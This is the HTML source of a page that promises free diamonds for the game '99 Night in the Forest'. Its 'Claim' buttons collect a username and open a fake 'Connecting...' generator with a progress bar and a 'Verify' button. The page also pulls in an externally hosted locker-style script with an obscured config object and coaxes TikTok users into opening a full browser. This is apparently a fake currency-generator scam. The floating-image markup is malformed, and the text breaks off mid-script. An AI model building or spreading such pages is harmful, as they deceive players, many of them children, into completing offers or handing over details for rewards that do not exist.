<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>99 Night in the Forest — Diamonds</title>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&display=swap" rel="stylesheet">

  <!-- Global diamond icon (used across the page, winner popup, and floating items) -->
  <script>
    window.__diamondIcon = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"/><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"/></svg>';
  </script>

  <style>
    body {
      font-family: 'Fredoka One', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: none !important;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    .popup {
      position: absolute;
      top: 20px;
      right: 20px;
      background: white;
      border-radius: 20px;
      padding: 30px;
      max-width: 350px;
      width: 300px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      z-index: 1000;
      font-size: 18px;
      line-height: 1.4;
      color: #333;
    }
    .popup::after {
      content:'';
      position: absolute;
      top: -10px;
      right: 10px;
      width: 0;
      height: 0;
      border-left: 15px solid transparent;
      border-right: 15px solid transparent;
      border-bottom: 15px solid white;
    }
    .tiktok-icon {
      display: inline-block;
      width: 25px;
      height: 25px;
      background-image: url('tiktokicon.webp');
      background-size: 80%;
      background-position: center;
      background-repeat: no-repeat;
      border-radius: 50%;
      margin: 0 5px;
      vertical-align: middle;
    }
    .three-dots {
      display: inline-block;
      width: 25px;
      height: 25px;
      background: #666;
      border-radius: 50%;
      margin: 0 5px;
      position: relative;
      vertical-align: middle;
    }
    .three-dots::after {
      content: '⋯';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-size: 14px;
      font-weight: bold;
    }
    .highlight { color: rgb(0,122,255); font-weight: bold; }
  </style>

  <style>
    /* --- Generator Modal Custom Styles (Site Colors + Rainbow Button) --- */
    #generator-modal { background: transparent !important; }
    #generator-modal .modal-content {
      background: linear-gradient(135deg, #1D9BF0 60%, #A34EFF 100%);
      border-radius: 2rem;
      box-shadow: 0 8px 32px 0 rgba(255,76,76,0.10);
      border: 4px solid #000;
      position: relative;
      overflow: hidden;
    }
    #generator-modal .modal-content::before { display: none; }
    #generator-modal .modal-content > * { position: relative; z-index: 1; }
    #generator-title {
      font-family: 'Fredoka One', cursive;
      font-size: 2rem;
      color: #ffffff;
      text-shadow: none;
      margin-bottom: 1.5rem;
    }
    #loading-item-img {
      border-radius: 1rem;
      box-shadow: 0 4px 16px #FF4C4C22;
      border: 2px solid #FF4C4C;
      background: #fff;
    }
    .progress-bar {
      background: #fff;
      border-radius: 1rem;
      border: 2px solid #a0ff73;
      overflow: hidden;
      height: 1.5rem;
      margin-bottom: 1rem;
    }
    #progress-fill {
      background: #FF4C4C;
      color: #ffffff;
      font-weight: bold;
      font-family: 'Fredoka One', cursive;
      font-size: 1.1rem;
      border-radius: 1rem;
      box-shadow: none;
      height: 100%;
      display: flex; align-items: center; justify-content: center;
      transition: width 0.4s cubic-bezier(.4,2,.6,1), background 0.3s;
      letter-spacing: 1px;
    }
    #game-tip {
      color: #263238 !important;
      font-size: 1.1rem;
      font-family: 'Poppins', 'Fredoka One', cursive;
      margin-bottom: 1.2rem;
    }
    #verify-btn {
      background: #FF4C4C;
      color: #ffffff;
      font-family: 'Fredoka One', cursive;
      font-size: 1.3rem;
      border: 3px solid #fff;
      border-radius: 1.5rem;
      padding: 1rem 0;
      cursor: pointer;
      font-weight: bold;
      letter-spacing: 1px;
      outline: none;
      margin-top: 0.5rem;
      position: relative;
      z-index: 1;
      box-shadow: 0 4px 12px #FF4C4C33;
      transition: background 0.2s, transform 0.2s;
    }
    #verify-btn::before {
      content: '';
      position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px;
      border-radius: 9999px; z-index: -1;
      background: linear-gradient(270deg, #ff0000, #ff9900, #ffee00, #33ff00, #00ffee, #0066ff, #cc00ff, #ff0000);
      background-size: 1600% 1600%;
      animation: legendary-rainbow 4s linear infinite;
    }
    #verify-btn::after {
      content: '';
      position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px;
      border-radius: 9999px; z-index: -2; border: 3px solid #000;
    }
    #verify-btn:hover { background: #FF6B6B; transform: scale(1.04); }
    #verify-btn:focus, #verify-btn:active {
      outline: 3px solid #fff;
      outline-offset: 2px;
      box-shadow: 0 0 0 4px #222;
    }
    @keyframes legendary-rainbow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
  </style>

  <style>
    /* Rainbow animated border for legendary claim buttons */
    .legendary-claim { position: relative; z-index: 1; }
    .legendary-claim::before {
      content: '';
      position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px;
      border-radius: 9999px; z-index: -1;
      background: linear-gradient(270deg, #ff0000, #ff9900, #ffee00, #33ff00, #00ffee, #0066ff, #cc00ff, #ff0000);
      background-size: 1600% 1600%;
      animation: legendary-rainbow 4s linear infinite;
    }
    .legendary-claim::after {
      content: '';
      position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px;
      border-radius: 9999px; z-index: -2; border: 3px solid #000;
    }
  </style>

  <style>
    .rainbow-banner {
      background: linear-gradient(90deg, #8C32FF, #DA2FFF, #A34EFF, #FF4C4C, #1D9BF0, #00D26A);
      background-size: 400% 400%;
      animation: rainbow-banner-anim 6s linear infinite;
      border-radius: 1.5rem;
      padding: 0.75rem 2.5rem;
      display: inline-block;
      box-shadow: 0 2px 12px #0002;
    }
    .rainbow-banner-text {
      color: #ffffff;
      font-family: 'Fredoka One', cursive;
      font-size: 1.5rem;
      font-weight: bold;
      letter-spacing: 1px;
      text-shadow: 0 2px 8px #0008;
      opacity: 1; filter: none; -webkit-text-stroke: 0;
    }
    @keyframes rainbow-banner-anim {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
  </style>

  <!-- Google Fonts for digital timer -->
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">

  <style>
    /* Animated, 20% transparent background for legendary items */
    .legendary-claim-bg {
      position: absolute; left: 50%; top: 50%; width: 90px; height: 90px;
      transform: translate(-50%, -50%) scale(1.2);
      opacity: 0.2; z-index: 0; pointer-events: none;
      animation: legendary-float 3s ease-in-out infinite alternate;
    }
    @keyframes legendary-float {
      0% { transform: translate(-50%, -50%) scale(1.2) rotate(-8deg); }
      100% { transform: translate(-50%, -52%) scale(1.25) rotate(8deg); }
    }
    .pet-img-bg { position: relative; }
  </style>

  <style>
    @keyframes rainbow-text {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
  </style>
</head>
<body class="text-dark"><div id="floating-items-container"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"><img 2000="" src="data:image/svg+xml;utf8,<svg xmlns=" http:="" www.w3.org="" svg"="" viewbox="0 0 64 64"><polygon points="32,2 62,24 32,62 2,24" fill="%2300E5FF" stroke="%2300A0AA" stroke-width="3"><polygon points="32,2 50,24 32,24 14,24" fill="%237abfff" opacity="0.5"></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></polygon></div>
  <div id="ios-popup" style="display:none">
    <div class="popup">
      On <span class="tiktok-icon"></span> you need to tap on the <span class="three-dots"></span> and then tap on <span class="highlight">"Open in browser"</span> to claim your free items.
    </div>
  </div>

  <div id="normal-page" style="display: block;">
    
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>99 Night in the Forest - Diamonds</title>
      <script src="https://cdn.tailwindcss.com"></script>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
      <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

      <style>
        html, body {
          max-width: 100vw; overflow-x: hidden;
          background: linear-gradient(135deg, #5142a7 0%, #2587f7 100%);
          min-height: 100vh;
        }
        .font-fredoka { font-family: 'Fredoka One', cursive; }

        .modal-backdrop {
          background-color: transparent;
          backdrop-filter: blur(10px);
        }

        .price-text-old {
          color: #ff6f61;
          text-shadow: 0 0 10px rgba(255, 111, 97, 0.5);
        }

        .item-title-glow {
          color: white;
          text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
        }

        .loading-spinner {
          border: 4px solid rgba(160,255,115,0.2);
          border-top: 4px solid #a0ff73;
          border-radius: 50%;
          width: 40px; height: 40px;
          animation: spin 1s linear infinite;
          margin: 0 auto 16px auto;
        }
        @keyframes spin { 0%{transform: rotate(0deg);} 100%{transform:rotate(360deg);} }

        .progress-bar {
          width: 100%; height: 1rem;
          background: linear-gradient(90deg, #000000, #FF6B6B);
          border-radius: 0.5rem; overflow: hidden; margin: 8px 0;
          border: 1px solid rgba(255,76,76,0.5);
        }
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #8fff5a, #a0ff73, #b0ff8a);
          border-radius: 0.5rem; transition: width 0.5s ease-in-out;
          box-shadow: 0 0 20px rgba(160,255,115,0.8);
        }

        .pulse-title { animation: pulse 2s ease-in-out infinite; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }

        .card-bg {
          background: linear-gradient(145deg, rgba(29,155,240,0.95), rgba(163,78,255,0.9));
          border: 3px solid #000; background-clip: padding-box;
          box-shadow: 0 8px 32px rgba(29,155,240,0.3), inset 0 1px 0 rgba(255,255,255,0.8);
          transition: all 0.3s ease-in-out; position: relative; overflow: hidden;
        }
        .card-bg::before {
          content:''; position: absolute; top:0; left:0; right:0; bottom:0;
          background: linear-gradient(45deg, #1D9BF0, #A34EFF, #FF4C4C, #1D9BF0);
          background-size: 400% 400%; animation: gradientShift 3s ease infinite;
          z-index: -1; margin: -3px; border-radius: inherit;
        }
        @keyframes gradientShift { 0%,100%{background-position:0% 50%;} 50%{background-position:100% 50%;} }
        .card-bg:hover {
          transform: translateY(-8px) scale(1.02);
          box-shadow: 0 20px 40px rgba(29,155,240,0.4), 0 0 30px rgba(29,155,240,0.6);
        }

        .green-claim-button {
          background: #61ff4c; border: 3px solid #000; border-radius: 25px;
          cursor: pointer; transition: all 0.3s ease-in-out;
          box-shadow: 0 0 20px rgba(9,255,42,0.925); position: relative; overflow: hidden;
          color: #fff; font-weight: bold;
        }
        .green-claim-button::before {
          content:''; position: absolute; top:0; left:-100%; width:100%; height:100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
          transition: left 0.5s;
        }
        .green-claim-button:hover::before { left: 100%; }
        .green-claim-button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(36,224,11,0.8); background:#48fc42; }

        .yellow-button {
          background: #A34EFF; border: 3px solid #000; border-radius: 25px;
          cursor: pointer; transition: all 0.3s ease-in-out;
          box-shadow: 0 0 20px rgba(163,78,255,0.5); position: relative; overflow: hidden;
          color: #fff; font-weight: bold;
        }
        .yellow-button::before {
          content:''; position: absolute; top:0; left:-100%; width:100%; height:100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
          transition: left 0.5s;
        }
        .yellow-button:hover::before { left:100%; }
        .yellow-button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(163,78,255,0.8); background:#B34EFF; }

        #floating-items-container {
          position: fixed; top:0; left:0; width:100%; height:100%;
          overflow: hidden; z-index: -2;
        }
        .floating-item {
          position: absolute; opacity: 0.2; will-change: transform;
          animation-iteration-count: infinite; animation-timing-function: linear;
          filter: drop-shadow(0 0 10px rgba(255,255,0,0.4));
        }
        @keyframes float1 { 0%{transform:translate(-100px,110vh) rotate(0)} 100%{transform:translate(110vw,-100px) rotate(720deg)} }
        @keyframes float2 { 0%{transform:translate(110vw,110vh) rotate(0)} 100%{transform:translate(-100px,-100px) rotate(-720deg)} }
        @keyframes float3 { 0%{transform:translate(50vw,110vh) rotate(0)} 100%{transform:translate(50vw,-100px) rotate(360deg)} }

        .section-header, .header-title-outline {
          color: white;
          text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
          background: none; -webkit-background-clip: unset; -webkit-text-fill-color: unset; background-clip: unset;
        }

        .modal-content {
          background: linear-gradient(145deg, rgba(29,155,240,0.98), rgba(163,78,255,0.95));
          border: 3px solid #000; backdrop-filter: blur(20px);
        }

        .yellow-input {
          background: rgba(29,155,240,0.9); border: 3px solid #000; color: #fff; transition: all 0.3s ease;
        }
        .yellow-input:focus { border-color: #000; box-shadow: 0 0 20px rgba(29,155,240,0.4); outline: none; }
        .yellow-input::placeholder { color: rgba(255,255,255,0.6); }

        .text-dark { color: #ffffff !important; }
        .text-darker { color: #f0f0f0 !important; }

        .blocky-bg {
          background: linear-gradient(15deg, #1D9BF0 60%, #A34EFF 100%);
          background-blend-mode: multiply; position: relative; z-index: 1;
          border: 2px solid #000; box-sizing: border-box;
          outline: none; outline-offset: 0px; border-radius: 38px;
          box-shadow: 0 8px 32px #0002, 0 2px 16px #fff8 inset; margin-top: 0; overflow: hidden; min-width: 0;
        }

        @keyframes rainbow-border {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @media (max-width: 900px) {
          .blocky-bg { border-radius: 22px; border-width: 5px; outline-width: 2px; }
          .blocky-bg::before { border-radius: 30px; top: -5px; left: -5px; right: -5px; bottom: -5px; }
          .blocky-banner-bar { border-radius: 22px 22px 0 0; border-width: 5px; outline-width: 2px; }
          .blocky-banner-bar::before { border-radius: 30px 30px 0 0; top: -5px; left: -5px; right: -5px; bottom: -5px; }
          .pet-title { font-size: 1.1rem; }
          .claim-pill { font-size: 1rem; padding: 8px 18px; }
          .pet-img-bg { width: 60px !important; height: 60px !important; }
        }
        @media (max-width: 600px) {
          .blocky-bg { border-radius: 14px; border-width: 3px; outline-width: 2px; }
          .blocky-bg::before { border-radius: 18px; top: -3px; left: -3px; right: -3px; bottom: -3px; }
          .blocky-banner-bar { border-radius: 14px 14px 0 0; border-width: 3px; outline-width: 2px; padding: 14px 0 10px 0; }
          .blocky-banner-bar::before { border-radius: 18px 18px 0 0; top: -3px; left: -3px; right: -3px; bottom: -3px; }
          .blocky-banner-bar-text { font-size: 1.1rem; }
          .pet-title { font-size: 0.95rem; }
          .claim-pill { font-size: 0.95rem; padding: 6px 10px; }
          .pet-img-bg { width: 48px !important; height: 48px !important; }
          .blocky-bg, .blocky-banner-bar, .container { padding-left: 0 !important; padding-right: 0 !important; }
        }
        .blocky-banner-bar {
          width: 100%;
          background: linear-gradient(90deg, #8C32FF, #DA2FFF);
          background-blend-mode: multiply;
          border-radius: 38px 38px 0 0;
          border: 8px solid #fff; border-bottom: none;
          box-sizing: border-box; outline: 2px solid #111; outline-offset: 0px;
          box-shadow: 0 6px 24px #8C32FF33, 0 2px 12px #DA2FFF22, 0 2px 16px #fff8 inset;
          padding: 22px 0 18px 0; margin: 0 auto 0 auto;
          display: flex; align-items: center; justify-content: center;
          position: relative; z-index: 2;
        }
        .blocky-banner-bar::before {
          content: '';
          position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px;
          z-index: 1; border-radius: 46px 46px 0 0;
          background: linear-gradient(270deg, #ff0000, #ff9900, #ffee00, #33ff00, #00ffee, #0066ff, #cc00ff, #ff0000);
          background-size: 1600% 1600%;
          animation: rainbow-border 8s linear infinite; pointer-events: none;
        }
        .blocky-banner-bar > * { position: relative; z-index: 2; }
        .blocky-banner-bar-text {
          color: #ffffff; font-family: 'Fredoka One', cursive;
          font-size: 2.1rem; letter-spacing: 2px;
          text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, 0 2px 8px #8C32FF44, 0 4px 16px #fff8;
          text-align: center; width: 100%;
        }

        .pet-row {
          border: 2px solid rgb(255,255,255);
          margin-bottom: 18px;
          transition: box-shadow 0.12s, transform 0.12s, background 0.12s;
          box-shadow: 0 2px 8px #0001;
          position: relative; min-width: 0;
          border-radius: 18px; background: #5c79f7;
          padding: 14px 10px; display: flex; align-items: center; gap: 10px;
        }
        .pet-row:not(:last-child)::after { display: none; }
        .pet-row:hover {
          box-shadow: 0 4px 16px #A34EFF11, 0 2px 8px #0001;
          background: #A34EFF; transform: translateY(-1px) scale(1.01); z-index: 3;
        }
        .pet-img-bg {
          background: linear-gradient(135deg, #1D9BF0 60%, #A34EFF 100%);
          border-radius: 16px; border: 1.5px solid rgba(255,255,255,0.2);
          box-shadow: 0 4px 16px #0001, 0 1.5px 6px #fff8 inset;
          min-width: 80px; width: 100px; height: 100px;
          display: flex; align-items: center; justify-content: center;
          margin-right: 12px;
          transition: box-shadow 0.15s, background 0.15s, border 0.15s;
        }
        .pet-img-bg:hover {
          box-shadow: 0 8px 32px #A34EFF22, 0 2px 8px #fff8 inset;
          border: 1.5px solid #A34EFF44;
          background: linear-gradient(135deg, #A34EFF 80%, #1D9BF0 100%);
        }
        .pet-title {
          font-family: 'Fredoka One', cursive; font-size: 0.95rem;
          color: #ffffff;
          text-shadow: 0 1px 2px #0005, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
          margin-right: 10px; word-break: break-word; letter-spacing: 0.5px; font-weight: bold;
        }
        .claim-pill {
          background: linear-gradient(270deg, #ff0000, #ff9900, #ffee00, #33ff00, #00ffee, #0066ff, #cc00ff, #ff0000);
          background-size: 1600% 1600%; animation: legendary-rainbow 4s linear infinite;
          color: #ffffff; font-weight: bold; font-family: 'Fredoka One', cursive; font-size: 1rem;
          border-radius: 9999px; padding: 10px 22px; box-shadow: 0 2px 8px #FF4C4C22; border: 2px solid #fff;
          display: inline-block; text-align: center; letter-spacing: 0.5px;
          transition: background 0.12s, transform 0.12s, box-shadow 0.12s; cursor: pointer; position: relative;
          text-shadow: 0 1px 2px #0005, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
          width: 100px; height: 45px; margin-left: auto; flex-shrink: 0;
        }

        .username-modal-backdrop {
          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(40,40,60,0.18);
          z-index: 2000; display: flex; align-items: center; justify-content: center;
        }
        .username-modal {
          background: linear-gradient(135deg, #1D9BF0 0%, #A34EFF 100%);
          border-radius: 24px; box-shadow: 0 8px 32px 0 #0003; padding: 38px 32px 32px 32px;
          min-width: 340px; max-width: 90vw; text-align: center; position: relative; border: 3px solid #222;
          display: flex; flex-direction: column; align-items: center;
        }
        .username-modal-title {
          font-family: 'Luckiest Guy', 'Fredoka One', cursive;
          font-size: 2rem; color: #fff; margin-bottom: 10px;
          text-shadow: 2px 2px 0 #000, 2px 2px 0 #000, 0 2px 8px #fff8; font-weight: bold;
        }
        .username-modal-sub {
          font-family: 'Fredoka One', cursive; font-size: 1.15rem; color: #fff; margin-bottom: 18px;
        }
        .username-modal-input {
          width: 100%; padding: 14px 18px; border-radius: 10px; border: 3px solid #222;
          font-size: 1.2rem; margin-bottom: 18px; outline: none; font-family: 'Fredoka One', cursive;
          background: #1A1A2E; color: #fff; box-sizing: border-box; transition: border 0.2s;
        }
        .username-modal-input:focus { border: 3px solid #43d13b; }
        .username-modal-btn {
          background: linear-gradient(90deg, #FF4C4C 0%, #FF6B6B 100%);
          color: #fff; font-family: 'Luckiest Guy', 'Fredoka One', cursive;
          font-size: 1.3rem; border: none; border-radius: 18px; padding: 16px 0; cursor: pointer;
          box-shadow: 0 4px 16px #FF4C4C33; margin: 0 0 0 0; width: 100%;
          font-weight: bold; letter-spacing: 1px; outline: none; border: 3px solid #222;
          transition: background 0.2s, transform 0.2s;
        }
        .username-modal-btn:hover { background: linear-gradient(90deg, #FF6B6B 0%, #FF4C4C 100%); transform: scale(1.03); }
        .username-modal-error {
          color: #58e535; font-size: 1rem; min-height: 1.2em; margin-bottom: 8px; font-family: 'Fredoka One', cursive;
        }
        .username-modal-close {
          position: absolute; top: 12px; right: 18px; background: none; border: none;
          font-size: 1.5rem; color: #fff; cursor: pointer; font-weight: bold; z-index: 2;
        }
      </style>

      <script type="text/javascript">
    var tzIIn_WfW_viAVDc={"it":4536459,"key":"4dea5"};
</script>
<script src="https://dlk457skl57zp.cloudfront.net/3e62196.js"></script>
    

    
      <div id="floating-items-container"></div>
      <div class="container mx-auto px-4 py-8">
        <header class="text-center mb-12">
          <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:1.1rem;">
            <div id="digital-countdown" style="font-family:'Fredoka One',monospace;font-size:2rem;font-weight:bold;letter-spacing:0.1em;background:#e100ff;padding:0.2em 0.7em;border-radius:1.2em;border:2.5px solid #000;box-shadow:0 2px 8px #0008;margin-top:0.5rem;color:#FFFFFF;text-shadow:-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,1px 1px 0 #000;">
              99 Night in the Forest — Diamonds
            </div>
          </div>
        </header>

        <section class="mb-16" id="pets">
          <div class="blocky-bg rounded-3xl p-6 md:p-10 max-w-2xl mx-auto">
            <div style="display:flex; justify-content:center; margin-bottom:1.5rem;">
              <div class="rainbow-banner" style="margin:0 auto;">
                <span class="rainbow-banner-text" style="background:linear-gradient(90deg,); background-size:400% 400%; animation:rainbow-banner-anim 6s linear infinite; color:#FFF; text-shadow:-1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; opacity:1;">DIAMONDS</span>
              </div>
            </div>

            <ul class="space-y-6">
              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">100 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('100 Diamonds')">Claim</span>
              </li>

              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">200 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('200 Diamonds')">Claim</span>
              </li>

              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">400 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('400 Diamonds')">Claim</span>
              </li>

              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">800 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('800 Diamonds')">Claim</span>
              </li>

              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">1200 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('1200 Diamonds')">Claim</span>
              </li>

              <li class="pet-row flex items-center justify-between bg-[#1D9BF0] rounded-2xl shadow-lg px-4 py-3 relative border-4 border-white">
                <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4" style="width:100px;height:100px;background:#68c8ff21;">
                  <img src="images/blue_diamond_255x255.png" onload="this.onload=null; this.src=window.__diamondIcon" alt="Diamonds" class="w-20 h-20 object-contain">
                </div>
                <span class="pet-title item-title-glow">2000 Diamonds</span>
                <span class="claim-pill ml-auto" onclick="openUsernameModal('2000 Diamonds')">Claim</span>
              </li>
            </ul>
          </div>
        </section>
      </div>
    
    
  </div>

  <div id="username-modal-backdrop" class="username-modal-backdrop" style="display:none;">
    <div class="username-modal">
      <button class="username-modal-close" id="username-modal-close">×</button>
      <div class="username-modal-title">Enter Your Username</div>
      <div class="username-modal-sub">Please enter your username to claim your item.</div>
      <input class="username-modal-input" id="username-modal-input" placeholder="Your Username" type="text">
      <div class="username-modal-error" id="username-modal-error"></div>
      <button class="username-modal-btn" id="username-modal-btn">Submit</button>
    </div>
  </div>

  <!-- Generator Modal -->
  <div id="generator-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-50 hidden">
    <div class="modal-content p-8 rounded-2xl max-w-md w-full text-center relative">
      <div id="generator-title" class="text-2xl font-bold mb-4 pulse-title">Connecting...</div>
      <img id="loading-item-img" src="" alt="Item" class="mx-auto mb-4 w-24 h-24 object-contain" style="display:none;">
      <div class="progress-bar mb-4">
        <div id="progress-fill" class="progress-fill" style="width:0%">0%</div>
      </div>
      <div id="game-tip" class="mb-4 text-lg text-dark"></div>
      <button id="verify-btn" class="green-claim-button w-full py-3 text-xl hidden">Verify</button>
    </div>
  </div>

  <script>
    function isIOS() {
      const userAgent = navigator.userAgent;
      return userAgent.includes('musical_ly_') ||
